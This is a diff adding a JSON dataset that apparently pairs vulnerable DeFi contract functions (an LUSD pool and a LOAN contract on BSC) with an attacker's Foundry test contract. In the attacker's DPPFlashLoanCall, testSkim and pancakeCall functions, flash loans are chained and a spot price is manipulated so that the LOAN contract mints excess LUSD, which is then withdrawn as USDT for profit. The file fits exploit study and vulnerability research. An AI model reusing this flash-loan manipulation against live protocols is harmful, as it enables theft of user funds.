@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "LUSDPOOL",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 amount) external nonReentrant {\n        require(!isBlackListed[msg.sender], \"This account is abnormal\");\n\n        LUSD.safeTransferFrom(msg.sender, address(this), amount);\n\n        uint256 nodeAmount = (amount * nodeFee) / 1e4;\n        LUSD.safeTransfer(nodePool, nodeAmount);\n\n        uint256 lpAmount = (amount * lpFee) / 1e4;\n        LUSD.burn(address(this), lpAmount);\n\n        uint256 l3Balance = L3.balanceOf(address(this));\n        L3.approve(address(router), l3Balance);\n        USDT.approve(address(router), lpAmount);\n        router.addLiquidity(\n            address(L3),\n            address(USDT),\n            l3Balance,\n            lpAmount,\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n\n        LUSD.burn(address(this), amount - nodeAmount - lpAmount);\n        USDT.safeTransfer(msg.sender, amount - nodeAmount - lpAmount);\n\n        emit Withdraw(msg.sender, amount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "DPPFlashLoanCall",
+    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == address(DPPOracle1)) {\n            takeFlashloan(DPPOracle2);\n        } else if (msg.sender == address(DPPOracle2)) {\n            takeFlashloan(DPPOracle3);\n        } else if (msg.sender == address(DPPOracle3)) {\n            takeFlashloan(DPP);\n        } else if (msg.sender == address(DPP)) {\n            takeFlashloan(DPPAdvanced);\n        } else {\n            BEP20USDT.approve(address(Router), type(uint256).max);\n\n            CakeLP.swap(0, 1_246_953_598_313_175_025, address(this), \"0x0\");\n            BTCB.approve(address(LOAN_ADDRESS), type(uint256).max);\n            LOAN_ADDRESS.supply(address(BTCB), 1_515_366_635_982_742);\n            LUSD.approve(address(POOL_ADDRESS), type(uint256).max);\n            POOL_ADDRESS.withdraw(LUSD.balanceOf(address(this)));\n            BTCB.transfer(address(CakeLP), BTCB.balanceOf(address(this)));\n            CakeLP.swap(799_764_317_883_596_339_564_612, 0, address(this), \"\");\n        }\n        //Repaying DPPOracle flashloans\n        BEP20USDT.transfer(msg.sender, quoteAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        //Repaying CakeLP (Pair) flashswap\n        BEP20USDT.transfer(address(CakeLP), 800_000 ether);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_756_866);\n        cheats.label(address(BEP20USDT), \"BEP20USDT\");\n        cheats.label(address(DPPOracle1), \"DPPOracle1\");\n        cheats.label(address(DPPOracle2), \"DPPOracle2\");\n        cheats.label(address(DPPOracle3), \"DPPOracle3\");\n        cheats.label(address(DPP), \"DPP\");\n        cheats.label(address(DPPAdvanced), \"DPPAdvanced\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(CakeLP), \"CakeLP\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LUSDTEST",
+    "source_type": "attacker_contract",
+    "function_name": "testSkim",
+    "original_code": "    function testSkim() public {\n        deal(address(BEP20USDT), address(this), 0);\n        emit log_named_decimal_uint(\n            \"Attacker BEP20USDT balance before attack\", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()\n        );\n\n        takeFlashloan(DPPOracle1);\n\n        emit log_named_decimal_uint(\n            \"Attacker BEP20USDT balance after attack\", BEP20USDT.balanceOf(address(this)), BEP20USDT.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LOAN",
+    "source_type": "victim_contract",
+    "function_name": "supply",
+    "original_code": "    function supply(\n        address supplyToken,\n        uint256 supplyAmount\n    ) external nonReentrant {\n        address[] memory path = new address[](2);\n        path[0] = address(supplyToken);\n        path[1] = address(USDT);\n        uint256 usdtAmount = router.getAmountsOut(supplyAmount, path)[1];\n\n        Order memory order = Order({\n            supplyToken: supplyToken,\n            payoutToken: info[supplyToken].payoutToken,\n            redeemFee: info[supplyToken].redeemFee,\n            supplyRatio: info[supplyToken].supplyRatio,\n            dailyRate: info[supplyToken].dailyRate,\n            supplyAmount: supplyAmount,\n            payoutAmount: (usdtAmount * info[supplyToken].supplyRatio) / 1e4,\n            supplyTime: block.timestamp,\n            redeemAmount: 0,\n            redeemTime: 0\n        });\n        orders[msg.sender].push(order);\n\n        IERC20(supplyToken).safeTransferFrom(\n            msg.sender,\n            address(this),\n            supplyAmount\n        );\n        LUSD.mint(msg.sender, order.payoutAmount);\n\n        emit Supply(\n            msg.sender,\n            orders[msg.sender].length - 1,\n            order.supplyToken,\n            order.payoutToken,\n            order.redeemFee,\n            order.supplyRatio,\n            order.dailyRate,\n            order.supplyAmount,\n            order.payoutAmount,\n            order.supplyTime\n        );\n    }\n\n",
+    "description": ""
+  }
+]
